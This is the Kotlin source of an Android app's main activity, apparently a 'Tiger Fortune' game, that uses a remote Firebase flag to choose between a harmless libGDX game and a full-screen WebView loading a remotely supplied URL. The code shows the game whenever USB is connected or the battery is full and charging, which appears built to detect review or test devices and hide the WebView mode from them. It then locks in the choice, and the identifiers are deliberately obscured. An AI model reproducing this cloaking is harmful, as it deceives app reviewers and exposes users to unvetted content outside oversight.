package com.tigerfortune.jogo

import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.AdRequest
import com.google.android.gms.ads.AdView
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import com.tigerfortune.jogo.databinding.ActivityMainBinding
import com.tigerfortune.jogo.util.DataStoreManager
import com.tigerfortune.jogo.util.Lottie
import com.tigerfortune.jogo.util.Once
import com.tigerfortune.jogo.util.getBatteryPercentage
import com.tigerfortune.jogo.util.internetConnection
import com.tigerfortune.jogo.util.isBatteryCharging
import com.tigerfortune.jogo.util.isUSB
import com.tigerfortune.jogo.util.log
import com.tigerfortune.jogo.util.setVisible
import com.tigerfortune.jogo.webView.WebViewFragment
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val isTigerPetrul = 149_7
        var urulaka    = ""

        val launcherGamera = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie
    private lateinit var banner: AdView

    val webViewFragment = WebViewFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkDataTigra()
//            startFragUID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                launcherGamera.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            banner.setVisible(View.VISIBLE)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        isTigerPetrul       -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        banner        = binding.banner.apply { loadAd(AdRequest.Builder().build()) }
        webViewFragment.onCreate(coroutine, binding.youTiger)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(4_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataTigra() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Tiger" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        urulaka = it
                        launcherGamera.emit(isTigerPetrul)
                    }
                }
                "Ovechka" -> {
                    log("DataStoreManager Key = GAME")
                    launcherGamera.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getIsTiger()
                }
            }
        }
    }

    private fun getIsTiger() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = JSONObject(getString("rain"))
                        log("success = $jsonData")

                        checkIsTiger(
                            beautiful = jsonData.getString("beautiful"),
                            difference  = jsonData.getString("difference")
                        )
                    } else {
                        launcherGamera.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    launcherGamera.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun checkIsTiger(beautiful: String, difference: String) {
        if (beautiful=="true") {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                openOvca()
            } else {
                openTiger(difference)
            }
        } else {
            openOvca()
        }
    }

    private fun openOvca() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Ovechka" }
            launcherGamera.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openTiger(second: String) {
        urulaka = second
        launcherGamera.tryEmit(isTigerPetrul)

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Tiger" }
            DataStoreManager.Link.update { urulaka }
        }
    }

}